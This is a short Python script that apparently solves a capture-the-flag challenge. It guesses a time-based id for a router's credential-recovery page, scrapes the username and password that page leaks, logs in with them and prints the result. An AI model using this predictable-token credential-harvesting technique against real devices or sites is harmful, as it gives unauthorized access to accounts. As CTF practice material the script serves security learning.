import datetime
import requests
from bs4 import BeautifulSoup

# Get the current UTC Time
now = datetime.datetime.utcnow()

# Format the timestamp same as MCU_recover_credentials.pl format
timestamp = now.strftime("%j%m%H%M%Y")

r = requests.get(f"https://thecybercoopctf-secure-router.chals.io/MCU_recover_credentials.pl?id={timestamp}")

soup = BeautifulSoup(r.text, "html.parser")

paragraphs = soup.find_all("p")
username = paragraphs[1].text
password = paragraphs[2].text

data = {"username": username, "password": password}

r = requests.post("https://thecybercoopctf-secure-router.chals.io/login.pl", data=data)

soup = BeautifulSoup(r.text, "html.parser")

print(soup.find("pre").text)

